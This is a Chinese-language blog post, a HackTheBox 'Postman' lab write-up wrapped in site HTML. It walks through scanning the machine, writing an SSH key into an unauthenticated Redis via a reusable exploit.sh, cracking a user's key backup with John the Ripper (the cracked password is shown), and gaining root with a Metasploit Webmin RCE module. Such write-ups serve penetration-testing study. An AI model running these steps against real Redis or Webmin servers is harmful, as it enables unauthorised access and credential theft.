@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fre4k5en.com","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.8.1","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<meta name="description" content="信息收集12#nmap -sV -p- 10.10.10.160   发现开启22,80,6379,10000端口,尝试登陆">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-Postman">
+<meta property="og:url" content="https://fre4k5en.com/2021/11/04/HackTheBox-Postman/index.html">
+<meta property="og:site_name" content="最后的家">
+<meta property="og:description" content="信息收集12#nmap -sV -p- 10.10.10.160   发现开启22,80,6379,10000端口,尝试登陆">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3gdq0rj30jd09942l.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3jrbffj30pg0laamp.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3j5f9yj30gi0eh3z3.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3ewxrlj30ls0450t6.jpg">
+<meta property="og:image" content="https://i.postimg.cc/qRxqf3mS/image.png">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3gwzzej30ky0e40wi.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3k297hj30qo0kb79e.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3ei91xj30li0eigqd.jpg">
+<meta property="og:image" content="https://i.postimg.cc/BbxFPHyS/image.png">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3ipfm8j30dd07jwgc.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3i7shfj30es0g1n4u.jpg">
+<meta property="og:image" content="https://i.postimg.cc/y6mXd3ZQ/image.png">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3fc7qjj30jo07kq4t.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3haoo6j30dc03h74t.jpg">
+<meta property="og:image" content="https://i.postimg.cc/xTHCYLN8/image.png">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3d1do6j30yy0jlq5g.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3hr7jkj30ya071aco.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3fvco2j30rk0fewjk.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3dn8idj30nt0c4adz.jpg">
+<meta property="article:published_time" content="2021-11-04T08:22:15.000Z">
+<meta property="article:modified_time" content="2021-11-04T09:38:03.308Z">
+<meta property="article:author" content="Fre4k5en">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3gdq0rj30jd09942l.jpg">
+
+
+<link rel="canonical" href="https://fre4k5en.com/2021/11/04/HackTheBox-Postman/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fre4k5en.com/2021/11/04/HackTheBox-Postman/","path":"2021/11/04/HackTheBox-Postman/","title":"HackTheBox-Postman"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>HackTheBox-Postman | 最后的家</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">最后的家</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Fre4k5en's Shelter</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%92%8Credis-crackit%E6%BC%8F%E6%B4%9E%E5%BE%97%E5%88%B0%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90"><span class="nav-text">利用redis未授权访问漏洞和redis crackit漏洞得到用户权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87redis%E7%94%A8%E6%88%B7%E8%BF%9B%E4%B8%80%E6%AD%A5%E6%8F%90%E6%9D%83"><span class="nav-text">通过redis用户进一步提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96root%E6%9D%83%E9%99%90"><span class="nav-text">获取root权限</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Fre4k5en"
+      src="https://cdn.jsdelivr.net/gh/Fre4k5en/BlogAssets/logo.jpeg">
+  <p class="site-author-name" itemprop="name">Fre4k5en</p>
+  <div class="site-description" itemprop="description">我的朋友好像都是网上的那些人，现实中不爱理人也没有人理我。有一天妈妈突然问我，万一有一天网络消失了，你该怎么办？那一刻我如醍醐灌顶，想通了很多事情。原来我人生中最重要的使命，就是保护互联网，不让它消失。</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/fre4k5en" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;fre4k5en" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:fre4k5en@gmail.com" title="E-Mail → mailto:fre4k5en@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fre4k5en.com/2021/11/04/HackTheBox-Postman/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://cdn.jsdelivr.net/gh/Fre4k5en/BlogAssets/logo.jpeg">
+      <meta itemprop="name" content="Fre4k5en">
+      <meta itemprop="description" content="我的朋友好像都是网上的那些人，现实中不爱理人也没有人理我。有一天妈妈突然问我，万一有一天网络消失了，你该怎么办？那一刻我如醍醐灌顶，想通了很多事情。原来我人生中最重要的使命，就是保护互联网，不让它消失。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="最后的家">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HackTheBox-Postman
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2021-11-04 16:22:15 / Modified: 17:38:03" itemprop="dateCreated datePublished" datetime="2021-11-04T16:22:15+08:00">2021-11-04</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#nmap -sV -p- 10.10.10.160</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://postimg.cc/2qwqjbCk"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3gdq0rj30jd09942l.jpg" alt="image.png"></a></p>
+<p>发现开启22,80,6379,10000端口,尝试登陆</p>
+<span id="more"></span>
+
+<p><a target="_blank" rel="noopener" href="https://postimg.cc/DSQ05JJr"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3jrbffj30pg0laamp.jpg" alt="image.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://postimg.cc/hhwXGqRd"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3j5f9yj30gi0eh3z3.jpg" alt="image.png"></a></p>
+<p>尝试弱口令爆破无果</p>
+<h3 id="利用redis未授权访问漏洞和redis-crackit漏洞得到用户权限"><a href="#利用redis未授权访问漏洞和redis-crackit漏洞得到用户权限" class="headerlink" title="利用redis未授权访问漏洞和redis crackit漏洞得到用户权限"></a>利用redis未授权访问漏洞和redis crackit漏洞得到用户权限</h3><p>注意到redis版本号为4.0.9,redis如果配置不当是可以不用密码就能够访问的</p>
+<p>这里先在kali下安装redis(官网安装，不做演示)</p>
+<p>直接尝试通过6379连接redis</p>
+<p>redis-cli -h 10.10.10.160</p>
+<p><a target="_blank" rel="noopener" href="https://postimg.cc/DJ4VM7XF"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3ewxrlj30ls0450t6.jpg" alt="image.png"></a></p>
+<p>而后制作一个ssh私钥</p>
+<figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#ssh-keygen -t rsa</span></span><br></pre></td></tr></table></figure>
+
+<p>目录选择/root/.ssh,密码随意,空密码也可以,会生成id_rsa.pub</p>
+<p>将私钥的首部和尾部分别加入两个换行符\n</p>
+<figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">#</span><span class="params">(<span class="variable">echo</span> -<span class="variable">e</span> <span class="string">&quot;\n\n&quot;</span>; <span class="variable">cat</span> /<span class="variable">root</span>/.<span class="variable">ssh</span>/<span class="variable">id_rsa</span>.<span class="variable">pub</span>; <span class="variable">echo</span> -<span class="variable">e</span> <span class="string">&quot;\n\n&quot;</span>)</span></span> &gt; 1.txt</span><br></pre></td></tr></table></figure>
+
+<p>保存为1.txt,</p>
+<p>清空原有的私钥,再利用crackit漏洞将1.txt的密钥写入redis中</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#<span class="regexp">/root/</span>redis-<span class="number">5.0</span>.<span class="number">7</span><span class="regexp">/src/</span>redis-cli -h <span class="number">10.10</span>.<span class="number">10.160</span> flushall</span><br><span class="line">#cat <span class="number">1</span>.txt | <span class="regexp">/root/</span>redis-<span class="number">5.0</span>.<span class="number">7</span><span class="regexp">/src/</span>redis-cli -h <span class="number">10.10</span>.<span class="number">10.160</span> -x set crackit</span><br></pre></td></tr></table></figure>
+
+<p>查看并配置redis中dir的值为目录下的.ssh，修改dbfilename的值为authorized_keys</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#redis-cli -h <span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">160</span></span><br><span class="line"><span class="number">10.10.10.160:6379</span>&gt; config get dir</span><br><span class="line"><span class="number">1</span>) <span class="string">&quot;dir&quot;</span></span><br><span class="line"><span class="number">2</span>) <span class="string">&quot;/var/lib/redis/.ssh&quot;</span></span><br><span class="line">(<span class="number">1</span>.05s)</span><br><span class="line"><span class="number">10.10.10.160:6379</span>&gt; config set dir /var/1ib/redis/.ssh</span><br><span class="line">OK</span><br><span class="line"><span class="number">10.10.10.160:6379</span>&gt; config set dbfilename<span class="string">&quot;authorized_keys&quot;</span></span><br><span class="line">OK</span><br><span class="line"><span class="number">10.10.10.160:6379</span>&gt; config get dbfilename</span><br><span class="line"><span class="number">1</span>) dbfilename</span><br><span class="line"><span class="number">2</span>) <span class="string">&quot;authorized_keys&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>在这里可能会存在添加不成功的情况，多添加几次就好，最后查看配置确保添加成功</p>
+<p>尝试使用该密钥连接<a href="mailto:redis@10.10.10.160">redis@10.10.10.160</a></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="selector-id">#ssh</span> -<span class="selector-tag">i</span> /root/<span class="selector-class">.ssh</span>/id_rsa redis<span class="keyword">@10</span>.10.10.160</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://postimg.cc/qhg4yzHx"><img src="https://i.postimg.cc/qRxqf3mS/image.png" alt="image.png"></a></p>
+<p>这里我们将上面的操作写成shell脚本,方便后续进行的登陆操作,因为靶机是大家公用的,所以你写的密钥很有可能过一会就被其他人修改了</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#!<span class="regexp">/bin/</span>bash</span><br><span class="line">rm <span class="regexp">/root/</span>.ssh/id*</span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line"></span><br><span class="line">(echo -e <span class="string">&quot;\n\n&quot;</span>; cat <span class="regexp">/root/</span>.ssh/id_rsa.pub; echo -e <span class="string">&quot;\n\n&quot;</span>) &gt; foo.txt</span><br><span class="line"></span><br><span class="line"><span class="regexp">/root/</span>redis-<span class="number">5.0</span>.<span class="number">7</span><span class="regexp">/src/</span>redis-cli -h <span class="number">10.10</span>.<span class="number">10.160</span> flushall</span><br><span class="line">cat foo.txt | <span class="regexp">/root/</span>redis-<span class="number">5.0</span>.<span class="number">7</span><span class="regexp">/src/</span>redis-cli -h <span class="number">10.10</span>.<span class="number">10.160</span> -x set crackit</span><br><span class="line"><span class="regexp">/root/</span>redis-<span class="number">5.0</span>.<span class="number">7</span><span class="regexp">/src/</span>redis-cli -h <span class="number">10.10</span>.<span class="number">10.160</span> config set dir <span class="regexp">/var/</span>lib<span class="regexp">/redis/</span>.ssh/</span><br><span class="line"><span class="regexp">/root/</span>redis-<span class="number">5.0</span>.<span class="number">7</span><span class="regexp">/src/</span>redis-cli -h <span class="number">10.10</span>.<span class="number">10.160</span> config set dbfilename <span class="string">&quot;authorized_keys&quot;</span></span><br><span class="line"><span class="regexp">/root/</span>redis-<span class="number">5.0</span>.<span class="number">7</span><span class="regexp">/src/</span>redis-cli -h <span class="number">10.10</span>.<span class="number">10.160</span> save</span><br><span class="line"></span><br><span class="line">ssh -i <span class="regexp">/root/</span>.ssh/id_rsa redis@<span class="number">10.10</span>.<span class="number">10.160</span></span><br></pre></td></tr></table></figure>
+
+<p>保存为exploit.sh,每次运行后输入私钥/留空即可连接</p>
+<p><a target="_blank" rel="noopener" href="https://postimg.cc/SXkQz235"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3gwzzej30ky0e40wi.jpg" alt="image.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://postimg.cc/4KdMMX9y"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3k297hj30qo0kb79e.jpg" alt="image.png"></a></p>
+<h3 id="通过redis用户进一步提权"><a href="#通过redis用户进一步提权" class="headerlink" title="通过redis用户进一步提权"></a>通过redis用户进一步提权</h3><p>首先查看passwd文件看看有哪些用户</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">cat <span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://postimg.cc/qh2GDFjg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3ei91xj30li0eigqd.jpg" alt="image.png"></a></p>
+<p>可以看到root Matt redis三个允许登陆的用户,然后使用find命令查看有Matt用户有哪些文件</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">find</span> <span class="regexp">/ -user Matt 2&gt;/</span>dev/<span class="keyword">null</span></span><br></pre></td></tr></table></figure>
+
+<p>不显示错误信息可以加上 2&gt;/dev/null</p>
+<p><a target="_blank" rel="noopener" href="https://postimg.cc/64pqD2tg"><img src="https://i.postimg.cc/BbxFPHyS/image.png" alt="image.png"></a></p>
+<p>看到有一个/home/Matt/user.txt和/opt/id_rsa.bak</p>
+<p><a target="_blank" rel="noopener" href="https://postimg.cc/qNTVqfCM"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3ipfm8j30dd07jwgc.jpg" alt="image.png"></a></p>
+<p>但是我们没有权限,但id_rsa.bak我们是有权限的</p>
+<p><a target="_blank" rel="noopener" href="https://postimg.cc/7G8mMzS3"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3i7shfj30es0g1n4u.jpg" alt="image.png"></a></p>
+<p>是Matt的rsa密钥备份文件,就从它下手,首先下载到本地环境</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">scp -i <span class="regexp">/root/</span>.ssh<span class="regexp">/id_rsa redis@10.10.10.160:/</span>opt<span class="regexp">/id_rsa.bak /</span>root</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://postimg.cc/6TQGb3zn"><img src="https://i.postimg.cc/y6mXd3ZQ/image.png" alt="image.png"></a></p>
+<p>kali下有一个非常好用的密钥破解工具JohnTheRipper,这里我们先用它自带的ssh2john脚本将id_rsa.bak转换成John能识别的格式,而后再用john尝试破解,就用kali自带的rockyou字典</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/john/</span>ssh2john.py id_rsa.bak &gt; Matt.key</span><br><span class="line">john Matt.key --wordlist=<span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://postimg.cc/fJNQT3F0"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3fc7qjj30jo07kq4t.jpg" alt="image.png"></a></p>
+<p>可以看到破解出Matt的密码为”computer2008”</p>
+<p>尝试ssh连接一下?</p>
+<p><a target="_blank" rel="noopener" href="https://postimg.cc/LJ4dLcm9"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3haoo6j30dc03h74t.jpg" alt="image.png"></a></p>
+<p>被拒绝,这里需要我们从redis用户使用su命令切换过去</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attribute">su - Matt</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://postimg.cc/Ln9R3YTF"><img src="https://i.postimg.cc/xTHCYLN8/image.png" alt="image.png"></a></p>
+<p>这里猜想可能是因为Matt用户设置了禁止直接从ssh登陆</p>
+<h3 id="获取root权限"><a href="#获取root权限" class="headerlink" title="获取root权限"></a>获取root权限</h3><p>通过Matt登陆后,我们使用账号密码登陆<a href="https://10.10.10.160:10000,进入webmin的后台/">https://10.10.10.160:10000,进入webmin的后台</a></p>
+<p><a target="_blank" rel="noopener" href="https://postimg.cc/D42V6H1P"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3d1do6j30yy0jlq5g.jpg" alt="image.png"></a></p>
+<p>看到Webmin的 版本为1.910,并且有一个软件包更新模块</p>
+<p>使用msf搜索webmin漏洞</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#msfconsole</span></span><br><span class="line">msf5&gt;<span class="keyword">search</span> webmin</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://postimg.cc/d7MxngYZ"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3hr7jkj30ya071aco.jpg" alt="image.png"></a></p>
+<p>使用exploit/linux/http/webmin_packageup_rce,配置好options,将ssl设置为true</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">msf5&gt;</span><span class="bash">use exploit/linux/http/webmin_pachage_rce</span></span><br><span class="line"><span class="meta">msf5&gt;</span><span class="bash">show options</span></span><br><span class="line"><span class="meta">msf5&gt;</span><span class="bash"><span class="built_in">set</span> rhost 10.10.10.160</span></span><br><span class="line"><span class="meta">msf5&gt;</span><span class="bash"><span class="built_in">set</span> username Matt</span></span><br><span class="line"><span class="meta">msf5&gt;</span><span class="bash"><span class="built_in">set</span> password computer2008</span></span><br><span class="line"><span class="meta">msf5&gt;</span><span class="bash"><span class="built_in">set</span> lhost 10.10.15.200</span></span><br><span class="line"><span class="meta">msf5&gt;</span><span class="bash"><span class="built_in">set</span> ssl <span class="literal">true</span></span></span><br><span class="line"><span class="meta">msf5&gt;</span><span class="bash">exploit</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://postimg.cc/DWKx1srq"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3fvco2j30rk0fewjk.jpg" alt="image.png"></a></p>
+<p>这里的lhost要填写ifconfig中tun0的ip地址</p>
+<p><a target="_blank" rel="noopener" href="https://postimg.cc/xqWMkQym"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3dn8idj30nt0c4adz.jpg" alt="image.png"></a></p>
+<p>成功获取到root权限</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Writeup/" rel="tag"># Writeup</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/11/04/HackTheBox-Forest/" rel="prev" title="HackTheBox-Forest">
+                  <i class="fa fa-chevron-left"></i> HackTheBox-Forest
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/11/04/HackTheBox-Academy/" rel="next" title="HackTheBox-Academy">
+                  HackTheBox-Academy <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Fre4k5en</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
